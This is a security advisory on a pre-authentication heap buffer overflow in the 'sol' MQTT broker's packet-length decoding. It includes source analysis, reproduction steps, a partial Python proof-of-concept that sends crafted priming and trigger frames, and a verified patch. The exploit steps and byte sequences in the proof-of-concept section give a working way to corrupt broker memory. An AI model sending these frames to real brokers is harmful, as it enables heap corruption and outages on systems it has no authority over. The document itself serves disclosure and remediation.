# Pre-auth heap out-of-bounds write from unbounded Remaining-Length decode and unchecked toread in recv_packet

**ID:** vuln-0006
**Severity:** HIGH
**Found:** 2026-11-17 10:21:03 UTC
**Target:** sol MQTT broker, source snapshot (repository /workspace/source)
**Endpoint:** MQTT fixed-header / Remaining-Length framing (recv_packet)
**Method:** TCP
**CWE:** CWE-787
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

The packet-framing code decodes the variable-length Remaining Length field without the four-byte limit the MQTT standard sets, and it does so on bytes it has not received, so continuation bits in stale read-buffer content keep the decode walking. The number of bytes consumed that way is then added to the attacker's declared length to decide how much more to read from the socket, without checking that total against the actual size of the per-client read buffer. The socket read therefore writes past the end of the buffer with bytes and a length the attacker chooses; sanitizer instrumentation reports heap-buffer-overflow writes of up to ~4 KB past a 64 KiB buffer and a decode walk that reads off the end of the allocation.

## Impact

An unauthenticated peer can make the broker write attacker-chosen bytes beyond the end of the per-client read buffer, which is a heap-corruption primitive on the request-framing path - the first code that runs for any connection, before CONNECT or authentication. The write length is derived from how far the attacker can drive the length-field walk into stale buffer content, so on the shipped 512 KB / 1 MB buffers the write can reach up to roughly a megabyte past the allocation; the demonstrated case writes 4001 bytes past a 64 KiB buffer (reported by AddressSanitizer as a 69533-byte out-of-bounds write into the heap). The same defect produces an out-of-bounds heap read of arbitrary distance (the decoder reads until it finds a byte without the continuation bit) and a framing desynchronisation where a client is left waiting on a packet the broker never finishes reading. What is proven is the write primitive, the out-of-bounds read and a sanitizer-detected process abort; conversion into controlled code execution was not demonstrated, and on the uninstrumented build the single overrun I tested did not by itself crash the process.

## Counterevidence

The cases against this finding are that `max_request_size` already bounds the packet (it does not: it bounds only the decoded length, not the total the read is sized from), that the decoder cannot read past the received bytes because the socket buffer is zeroed (it is not: `rbuf` is allocated once per client and reused across packets and across pooled client objects, and the write happens before any such assumption could hold), and that the AddressSanitizer abort - not the corruption - is what constitutes the finding. The last point is the real constraint: the overrun was reproduced with instrumentation that aborts on the out-of-bounds access, and one subsequent attempt on the uninstrumented production build (sending the same 4001-byte overrun and then closing the connection so that the corrupted chunk is freed) did not crash the process. What remains demonstrated on the uninstrumented build is the out-of-bounds write itself, measured at the call site: `toread = 69537` against a 65536-byte allocation, with the recv requesting 69533 bytes at offset 4. I therefore scored integrity high and availability none rather than claiming a crash or code execution I did not observe. No validation, length cap or allocation check exists on this path - the search covered the decoder, its only call site, the size check and the two buffer allocations.

## Confidence Rationale

The framing arithmetic and the out-of-bounds access were reproduced on instrumented builds and the `toread` values were measured directly on the uninstrumented build at the exact source lines; the only unproven part is the conversion of the write primitive into a crash or control-flow change on the shipping build, which is reflected in the availability metric rather than in the confidence.

## What Would Change This Severity

A demonstrated crash, heap-metadata abort or control-flow influence from the same overrun on the uninstrumented production build would raise availability to high and the score to about 9.1 (critical); conversely, evidence that a fresh connection always starts with a zeroed read buffer and can never inherit primed bytes would reduce the practical overwrite length to the single-frame variant's five bytes and lower the integrity rating, though not below high severity.

## Technical Analysis

Two defects combine in the framing path.

**1. The length decode has no bound and reads bytes that were never received.** `src/mqtt.c:136-153`:

```c title=src/mqtt.c startLineNumber=136 endLineNumber=153
usize mqtt_decode_length(u8 *buf, unsigned *pos)
{
    u8 c;
    u64 multiplier = 1LL;
    u64 value      = 0LL;
    *pos           = 0;

    do {
        c = *buf;
        value += (c & 127) * multiplier;
        multiplier *= 128;
        ++buf;
        ++(*pos);
    } while ((c & 128) != 0);

    return value;
}
```

The loop stops only on a byte whose bit 7 is clear. `MAX_LEN_BYTES` (defined at `src/mqtt.c:59`) is used exclusively by the encoder (`mqtt_encode_length`, `src/mqtt.c:112`); the decoder has no equivalent cap, and the comment above it records the gap as a TODO ("Handle case where multiplier > 128 * 128 * 128").

Its caller violates the decoder's implicit precondition. `recv_packet` reads at most four bytes into `c->rbuf` (`src/server.c:484` for the first two, `src/server.c:530` for two more) and then calls the decoder on `c->rbuf + 1`, i.e. on `rbuf[1], rbuf[2], rbuf[3]` - three bytes that were received and `rbuf[4..]`, which were not. `rbuf` is not cleared between packets (`process_message` resets only `toread`, `read` and `rpos`), and `client_init` reuses a `struct client` from a pool without touching an already allocated `rbuf` (`src/server.c:392-394`), so `rbuf[4..]` holds either the previous packet's bytes on the same connection or bytes primed by an earlier connection that occupied the same pool slot. An attacker who first sends a normally framed packet whose body is a run of `0x80` bytes chooses that content.

**2. `toread` is computed from the decoded length and the walk length, but only the decoded length is validated.** `src/server.c:545-575`:

```c title=src/server.c startLineNumber=545 endLineNumber=575
        pktlen = mqtt_decode_length(c->rbuf + 1, &pos);

        /*
         * Set return code to -ERRMAXREQSIZE in case the total packet len
         * exceeds the configuration limit `max_request_size`
         */
        if (pktlen > conf->max_request_size)
            return -ERRMAXREQSIZE;

        /*
         * Update the toread field for the client with the entire length of
         * the current packet, which is comprehensive of packet length,
         * bytes used to encode it and 1 byte for the header
         */
        c->rpos   = pos + 1;
        c->toread = pktlen + pos + 1; // pos = bytes used to store length

        /* Looks like we got an ACK packet, we're done reading */
        if (pktlen <= 4)
            goto exit;

        c->status = WAITING_DATA;
    }

    nread = recv_data(&c->conn, c->rbuf + c->read, c->toread - c->read);
```

`c->rbuf` is allocated with exactly `conf->max_request_size` bytes (`src/server.c:392-394`, default `512KB` per `src/config.h:73`). The check on line 551 bounds `pktlen` only, while `toread = pktlen + pos + 1` includes the fixed header byte and the `pos` length bytes, and `pos` is whatever the unbound walk consumed - attacker-influenced through the stale content. Whenever `pktlen == max_request_size` (the comparison is strict `>`), `toread` exceeds the allocation by `pos + 1` bytes and the `recv` on line 575 writes that far past the end of the buffer. The observed arithmetic for a 64 KiB buffer is `pktlen = 65536`, `pos = 4000`, `toread = 69537`: a 4001-byte overwrite of whatever follows `rbuf` on the heap, carrying the attacker's socket bytes.

Two further details in the same code: `pktlen` is declared `unsigned int` while `mqtt_decode_length` returns `usize`, so a five-or-more-byte length field truncates the decoded value (this is reachable from the stale-walk primitive as well and is why the fix moves the variable to `usize`), and `pos` can grow to the length of the stale run, i.e. up to the size of the read buffer itself.

Runtime confirmation on the uninstrumented build (measured under the debugger at the two source lines above):

```
BEFORE-DECODE: c->read=4 c->rpos=0 c->toread=0
AT-RECV-575: c->toread=33102 c->read=4 rbuf_capacity=65536  (toread - read = 33098)   <- priming packet
AT-RECV-575: c->toread=69537 c->read=4 rbuf_capacity=65536  (toread - read = 69533)   <- trigger
```

Controls: none. The decoder cannot tell received bytes from stale ones, there is no cap on continuation bytes, and no code path re-checks `toread` against the buffer size. `max_request_size` therefore does not protect the read buffer at all. Framing runs inside `recv_packet` before any CONNECT or credential check, so the primitive is reachable pre-authentication with a bare TCP connection.

## Proof of Concept

1. Build the broker from the snapshot with AddressSanitizer/UBSan instrumentation, and separately with the project's production flags.
2. Start an instance bound to 127.0.0.1 with `max_request_size 65536`.
3. Open one TCP connection. First send a normally framed PUBLISH (`0x30`, a well-formed Remaining Length, a 2-byte topic length of `0x8080` and an all-`0x80` body) that fits the configured limit. This leaves the read buffer filled with continuation bytes.
4. On the same connection, send the four bytes `30 80 80 84` followed by 69533 bytes. The 4th length byte is out of the received window, so the decoder continues into the primed buffer until the byte at offset 4000 terminates the walk, giving `pos = 4000` and `toread = 65536 + 4000 + 1 = 69537` on a 65536-byte buffer.
5. Observe the sanitizer report: `heap-buffer-overflow ... WRITE of size 69533` with the stack `recv <- recv_bytes <- conn_recv <- recv_data <- recv_packet (src/server.c:575)`, destination one byte past the end of the read-buffer allocation.
6. To observe the out-of-bounds read on its own, prime the read buffer with continuation bytes that extend to its end and then send `30 80 80 80`: the report is `heap-buffer-overflow ... READ of size 1` inside `mqtt_decode_length (src/mqtt.c:145)` from `recv_packet (src/server.c:545)`.
7. To observe the same effect with a single frame and no priming, use a 1 MiB limit and send `30 80 80 C0` followed by 1048576 bytes: the declared length equals the limit and passes the size check, while `pos = 4` makes `toread = 1048581` against a 1048576-byte buffer.
8. Confirm reachability without authentication by noting that no CONNECT packet is sent in any step, and that after the broker rejects the frame it continues to answer PINGREQ on a fresh connection.

def vlq(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n:
            b |= 0x80
        out.append(b)
        if not n:
            return bytes(out)


def prime_continuation(total):
    """PUBLISH leaving rbuf[4..total-1] = 0x80 (topic length 0x8080)."""
    topiclen = 0x8080
    body_len = total - 4
    payloadlen = body_len - 2 - topiclen
    body = b"\x80\x80" + b"\x80" * topiclen + b"\x80" * payloadlen
    return b"\x30" + vlq(body_len) + body


def prime_stop(total, stop_at):
    """PUBLISH leaving rbuf[4..stop_at-1] = 0x80 and rbuf[stop_at] = 0x00."""
    topiclen = 0x8080
    topic = bytearray(b"\x80" * topiclen)
    topic[stop_at - 6] = 0x00
    body = b"\x80\x80" + bytes(topic) + b"\x80" * 200
    return b"\x30" + vlq(len(body)) + body


def main():

    print("binary        :", BIN)
    print("max_request_sz:", MAXREQ_TEXT, "=", MAXREQ)
    proc = start_broker()
    print("broker pid    :", proc.pid)
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=5)
        s.settimeout(5)
        try:
            if variant == "toread":
                frame = bytes.fromhex("30 80 80 C0") + b"\x00" * MAXREQ
                print("frame         : 30 80 80 C0 + %d bytes -> pktlen=%d"
                      " (== max, passes the check), pos=4, toread=%d"
                      % (MAXREQ, MAXREQ, MAXREQ + 5))
                s.sendall(frame)
            elif variant == "prime-walk":
                p = prime_continuation(MAXREQ)
                print("prime         : %d-byte PUBLISH, body filled with 0x80"
                      % len(p))
                s.sendall(p)
                time.sleep(1.0)
                print("trigger       : 30 80 80 80 (walk continues into rbuf[4..])")
                s.sendall(bytes.fromhex("30 80 80 80"))
            elif variant == "toread-mult":
                p = prime_stop(MAXREQ, 4000)
                print("prime         : %d-byte PUBLISH, rbuf[4..3999]=0x80,"
                      " rbuf[4000]=0x00" % len(p))
                s.sendall(p)
                time.sleep(1.0)
                print("trigger       : 30 80 80 84 + 69533 bytes -> pos=4000,"
                      " toread=%d vs rbuf=%d" % (MAXREQ + 4001, MAXREQ))
                s.sendall(bytes.fromhex("30 80 80 84") + b"\x00" * 69533)
            else:
                raise SystemExit("unknown variant " + variant)
        except OSError as exc:
            print("send          :", type(exc).__name__, exc)
        time.sleep(2.0)
        print("alive         :", proc.poll() is None, "exit:", proc.poll())
        s.close()
        print("--- broker output ---")
        text = ""
        for name in ("broker.out",):
            path = os.path.join(DIR, name)
            if os.path.exists(path):
                text += open(path, errors="replace").read()
        adir = os.path.join(DIR, "asan")
        if os.path.isdir(adir):
            for f in sorted(os.listdir(adir)):
                text += open(os.path.join(adir, f), errors="replace").read()
        print(text[-3000:])
    finally:
        if proc.poll() is None:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=4)
            except (OSError, subprocess.TimeoutExpired):
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except OSError:
                    pass


if __name__ == "__main__":
    main()

## Remediation

1. Bound the length decode: stop after four bytes have been consumed and report the packet as malformed when the field is not terminated by then, so the walk can never continue into stale or unrelated memory.
2. Make the decode aware of what was actually received: pass the number of length bytes present in the read buffer and refuse to decode beyond it, instead of handing the decoder a pointer into a buffer that was only partially filled.
3. Validate the whole frame before reading it: check that the fixed-header byte, the length-field bytes actually consumed and the decoded remaining length together do not exceed the size the read buffer was allocated with, and reject the packet otherwise. Keep the check as a single comparison on the total so no combination of a small decoded length and a long length field can pass.
4. Keep the decoded length in a wide enough type: the decoder returns a 64-bit value, so holding it in a 32-bit variable silently truncates and can turn an oversized packet into an accepted one.
5. Clear or overwrite the connection read buffer when a new connection is accepted, and reopen each framing state machine from a defined state, so leftover bytes from a previous packet or a recycled client object can never be interpreted as part of the next length field.
6. Add regression tests that feed length fields with five or more continuation bytes, length fields whose last byte was never received, and frames whose total size is exactly the configured maximum, asserting a clean protocol error rather than an out-of-bounds access.

Trace through the patched code: `recv_packet` now hands the decoder `c->read - 1`, i.e. exactly the number of length bytes present (three when four bytes have been received). The decoder returns `(usize) -1` as soon as it would consume a byte it was not given or a fifth byte, and the caller turns that into `-ERRPACKETERR` before `pos` or `toread` are computed, so `toread` can no longer be larger than the frame the attacker declared. The remaining size test compares the full frame (`pktlen + pos + 1`) with `max_request_size`, which is exactly the allocation size of `rbuf`, so the recv at `src/server.c:575` can no longer write past the buffer even for a maximum-sized frame. `pktlen` is now `usize`, so the 64-bit decode result is no longer truncated into a 32-bit variable.

**Gate 3 - bypass review (executed).** Equivalent sinks: `mqtt_decode_length` has exactly one call site (`src/server.c:545`); `grep -rn mqtt_decode_length src/` confirms it, and the header prototype was updated with it. Alternate malicious inputs tried against the patched broker: `30 FF FF FF FF 7F` (five continuation bytes) - rejected, broker still answers PINGREQ on a fresh connection; `30 80 80 80 00` (four-byte prefix whose fourth byte was not received) - rejected, broker still serving; `30 80 80 C0` + maximum-sized body at both 64 KiB and 1 MiB - rejected. Legitimate framing still works across every prefix width: single-byte, two-byte and three-byte Remaining Length packets were all delivered (500-byte payload for the two-byte form, 1048547-byte payload filling a frame of exactly `max_request_size` bytes for the three-byte form). The sibling length arithmetic in the PUBLISH and CONNECT decoders is a different defect class with its own report and is not part of this change.

**Gate 4 - preserved behaviour (executed).** `python3 test_smoke.py --port <patched instance>` reports `RESULT: 8/9` on both the production-flags and the sanitizer build; CONNECT, SUBSCRIBE/SUBACK, cross-connection PUBLISH delivery, PINGREQ/PINGRESP, DISCONNECT and post-run liveness all pass. The single failing check (`broker logged the connections`) fails identically on the unpatched binary because the broker's log file is block-buffered while running - after a clean shutdown the same instance's log contains the client identifiers.

**Gap.** One behaviour change is intentional and should be reviewed: a frame whose total size exceeds `max_request_size` is now rejected, where previously a payload of exactly `max_request_size` was accepted and overran the buffer by `pos + 1` bytes. Deployments that legitimately need frames of exactly the configured maximum must raise `max_request_size` accordingly; the check now measures the whole frame rather than the payload alone, which matches how the buffer is allocated.

## Assumptions

The attacker can open a TCP connection to the broker's listening port and send arbitrary bytes; no authentication or prior CONNECT is needed, because framing happens in `recv_packet` before any protocol or credential processing. Reproducing the largest overwrite requires two packets on the same connection (or on a connection that reuses a pooled client object) so that the read buffer holds attacker-chosen continuation bytes beyond the received length - the single-frame variant needs only one connection and one frame. The buffer size is operator-configured; the demonstration used 64 KiB and the shipped-style 1 MiB in order to reach the boundary quickly, and the same arithmetic applies to the default 512 KiB.
